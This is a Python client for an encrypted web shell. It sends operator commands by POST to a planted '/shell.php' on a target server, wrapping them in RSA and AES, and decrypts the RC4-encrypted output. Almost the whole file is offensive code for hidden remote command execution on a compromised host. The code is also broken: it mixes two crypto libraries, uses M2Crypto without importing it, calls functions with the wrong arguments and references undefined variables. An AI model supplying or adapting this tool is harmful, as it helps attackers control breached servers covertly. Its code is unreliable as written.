#!/usr/bin/python
import Crypto
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
import httplib, urllib, sys, base64, binascii, os, re
from optparse import OptionParser

pub_key = Crypto.PublicKey.RSA.import_key(open('./local/pub.key').read())
priv_key = Crypto.PrivateKey.RSA.import_key(open('./local/priv.key').read())


def main():
###
#ARG PARSING!!!
###
	parser = OptionParser(usage="USAGE: %prog --host=127.0.0.1 --path=/shell.php", version= "%prog 1.0")
	
	parser.add_option("--host", dest="host",
		help="HOSTNAME should just be a hostname", metavar="HOSTNAME",
		action="store",
		default=True)
	parser.add_option("--path", dest="path",
		help="Path from root",
		action="store",
		default=True)
	(options, args) = parser.parse_args()
	if len(sys.argv) != 3:
		parser.error("Options are in the wrong format")
		usage()
	print "[*] Enter: \'/quit\' to quit"
	http_shell(options.host, options.path)
	sys.exit(0)

def usage():
	print "USAGE: ./shell.py --host=127.0.0.1 --path=/shell.php"

def priv_decrypt(key, encrypted):
	plaintext=key.private_decrypt(encrypted, M2Crypto.RSA.pkcs1_oaep_padding)
	return plaintext

def post_cmd(password, cmd, host, location):
 	params = urllib.urlencode({'cmd':cmd, 'id':password})
	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
	conn = httplib.HTTPConnection(host)
	conn.request("POST", location, params, headers)
	response=conn.getresponse()
	response=response.read()
	return response

def parse_response(data):
	data_split=data.split("<br />")
	cipher_envelope = base64.b64decode(data_split[0])
	data = base64.b64decode(data_split[1])
	return cipher_envelope, data

def decrypt_data(encrypt_envelope, data):
	decrypt_envelope = priv_key.private_decrypt(encrypt_envelope, M2Crypto.RSA.pkcs1_padding)
	rc4 = M2Crypto.RC4.RC4(decrypt_envelope)
	plaintext = rc4.update(data)
	return plaintext

def get_reason(data):
	if "undefined function openssl_private_decrypt()" in data:
		return "Webserver does not support OpenSSL"	

def send_command(command, host, path):
	session_key = get_random_bytes(24)
	# Encrypt the session key with the public RSA key
	cipher_rsa = PKCS1_OAEP.new(pub_key)
	enc_session_key = cipher_rsa.encrypt(session_key)

	# Encrypt the data with the AES session key
	cipher = AES.new(session_key, AES.MODE_CBC)
	ciphertext  = cipher.encrypt(pad(data, AES.block_size))

	response = post_cmd(enc_session_key, ciphertext, host, path) #post response
	return response
	
def http_shell(host, path):
	input=""
	while input != '/quit':

	        input=""
	        input=raw_input('\x1b[31mshell\x1b[0m\x1b[34m>\x1b[0m')
		
		if input== '/quit':
			sys.exit(0)

		response = send_command(input)	
		
		#print response
	
		if len(response) < 20: # No Response Returned
			continue
		try:
			cipher_envelope, data = parse_response(response)
		except:
			print "[!] " + get_reason(response)
                        continue

		try:
			plain_text = decrypt_data(cipher_envelope, data)
		except:
                        print "[!] Something Went Wrong- Bad Keys Perhaps?"
			continue
			
		print plain_text

if __name__ == "__main__":
	main()
